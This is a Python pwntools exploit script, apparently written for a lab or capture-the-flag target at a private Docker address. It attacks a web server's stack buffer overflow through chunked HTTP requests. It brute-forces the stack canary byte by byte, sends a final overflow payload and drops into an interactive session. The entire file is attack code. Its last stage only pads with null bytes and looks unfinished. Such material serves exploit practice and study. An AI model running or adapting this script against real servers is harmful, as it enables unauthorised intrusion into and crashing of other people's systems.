#! /usr/bin/env python3

from pwn import *

context.log_level = "ERROR"
# p = remote("172.17.0.2", 80)

def checker(data):
    payload = b"GET / HTTP/1.1\n Host: something.com\n Transfer-Encoding: chunked\n"
    payload += data
    p.send(payload)

# Brute Force Stack cookie

print("Brute Forcing the stack cookie")
payload = b"A"*(5063)
payload += b"\x00"
for x in range(8):
    for i in range(256):
        p = remote("172.17.0.2", 80)
        data = payload
        data += i.to_bytes(1, byteorder='big')

        request = b'GET / HTTP/1.1\r\n' + \
                  b'Host: example.com\r\n' + \
                  b'Transfer-Encoding: chunked\r\n' + \
                  b'\r\n' + \
                  data
        p.send(request)
        try:
            p.recv()
            print(f"BYTE {i} FOUND")
            payload += i.to_bytes(1, byteorder='big')
            p.close()
            break
        except:
            p.close()
            pass

# EXPLOIT

p = remote("172.17.0.2", 80)

data = payload + b"\x00"*100

request = b'GET / HTTP/1.1\r\n' + \
          b'Host: example.com\r\n' + \
          b'Transfer-Encoding: chunked\r\n' + \
          b'\r\n' + \
          data

p.send(request)
print(p.recv())
          
# This `request` bytes object is ready to be sent over a network connection.

p.interactive()
